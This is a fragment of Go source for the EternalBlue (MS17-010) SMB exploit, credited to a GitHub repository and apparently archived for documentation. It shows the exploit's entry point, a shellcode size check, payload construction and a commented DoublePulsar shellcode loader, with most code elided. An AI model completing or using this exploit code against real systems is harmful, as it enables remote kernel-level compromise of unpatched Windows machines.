//Credit to Github user: For-ACGN
//Repo: https://github.com/For-ACGN/MS17-010
//Original link: https://github.com/For-ACGN/MS17-010/blob/main/main.go

//Archived here for documentation purposes
...
func main() {
	...
	err = eternalBlue(address, 12, 12, sc)
	if err != nil {
		log.Fatal(err)
	}
...
func eternalBlue(address string, initialGrooms, maxAttempts int, shellcode []byte) error {
	// check shellcode size
	const maxShellcodeSize = packetMaxLen - packetSetupLen - len(loader) - 2 // uint16
	l := len(shellcode)
	if l > maxShellcodeSize {
		return fmt.Errorf("shellcode size > %d", l)
	}
	payload := makeKernelUserPayload(shellcode)
	var (
		grooms int
		err    error
	)
...
func makeKernelUserPayload(sc []byte) []byte {
	// test DoublePulsar
	// sc, err := ioutil.ReadFile("shellcode.bin")
	// if err != nil {
	// 	panic(err)
	// }
	// return sc
